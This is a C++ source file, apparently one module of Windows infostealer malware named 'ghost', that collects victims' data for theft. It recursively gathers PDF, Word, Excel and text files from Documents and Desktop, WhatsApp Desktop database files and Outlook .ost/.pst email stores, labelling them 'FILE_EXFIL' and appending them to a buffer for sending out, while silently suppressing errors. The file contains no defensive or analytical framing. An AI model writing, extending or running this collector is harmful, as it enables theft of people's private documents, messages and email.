#include "collector.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <filesystem>
#include <fstream>
#include <algorithm>

namespace ghost {
namespace collector {
namespace files {

std::string ExpandEnvStr(const std::string& path) {
    char expanded[MAX_PATH];
    ExpandEnvironmentStringsA(path.c_str(), expanded, MAX_PATH);
    return std::string(expanded);
}

void GrabFileToBuffer(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return;
    
    std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    if (!data.empty()) {
        std::string header = "\n[FILE_EXFIL: " + path + "]\n";
        AppendToBuffer((const uint8_t*)header.c_str(), header.size());
        AppendToBuffer(data.data(), data.size());
    }
}

void CrawlUserDirs() {
    std::vector<std::string> targetDirs = {
        ExpandEnvStr("%USERPROFILE%\\Documents"),
        ExpandEnvStr("%USERPROFILE%\\Desktop")
    };
    std::vector<std::string> targetExts = {".pdf", ".docx", ".txt", ".xlsx"};

    for (const auto& dir : targetDirs) {
        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
                if (!entry.is_regular_file()) continue;
                
                if (std::filesystem::file_size(entry) > 5 * 1024 * 1024) continue;

                std::string ext = entry.path().extension().string();
                std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                
                if (std::find(targetExts.begin(), targetExts.end(), ext) != targetExts.end()) {
                    GrabFileToBuffer(entry.path().string());
                }
            }
        } catch(...) {}
    }
}

void ScanWhatsAppCache() {
    std::string path = ExpandEnvStr("%LOCALAPPDATA%\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState\\");
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
            if (entry.path().extension() == ".db" || entry.path().extension() == ".sqlite") {
                GrabFileToBuffer(entry.path().string());
            }
        }
    } catch(...) {}
}

void ScanEmailStores() {
    std::string path = ExpandEnvStr("%LOCALAPPDATA%\\Microsoft\\Outlook\\");
    try {
        for (const auto& entry : std::filesystem::directory_iterator(path)) {
            if (entry.path().extension() == ".ost" || entry.path().extension() == ".pst") {
                std::ifstream file(entry.path().string(), std::ios::binary);
                if (file.is_open()) {
                    std::vector<uint8_t> data(2 * 1024 * 1024);
                    file.read((char*)data.data(), data.size());
                    size_t bytesRead = file.gcount();
                    if (bytesRead > 0) {
                        std::string header = "\n[EMAIL_STORE: " + entry.path().string() + "]\n";
                        AppendToBuffer((const uint8_t*)header.c_str(), header.size());
                        AppendToBuffer(data.data(), bytesRead);
                    }
                }
            }
        }
    } catch(...) {}
}

} // namespace files
} // namespace collector
} // namespace ghost